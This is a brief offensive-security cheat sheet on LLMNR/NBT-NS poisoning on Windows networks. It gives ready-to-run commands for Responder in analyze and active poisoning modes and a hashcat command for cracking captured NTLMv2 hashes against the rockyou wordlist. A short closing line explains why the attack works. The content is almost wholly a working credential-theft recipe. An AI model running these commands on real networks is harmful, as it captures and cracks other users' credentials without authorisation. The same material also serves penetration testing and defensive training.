# Responder LLMNR/NBT-NS Poisoning

Capturing NTLMv2 hashes via LLMNR/NBT-NS spoofing on Windows networks.

```bash
# Start Responder in analyze mode
responder -I eth0 -A

# Active poisoning
responder -I eth0 -wrf

# Cracking captured hashes
hashcat -m 5600 hashes.txt rockyou.txt
```

LLMNR is enabled by default on Windows. Any DNS resolution failure triggers a broadcast that Responder answers.
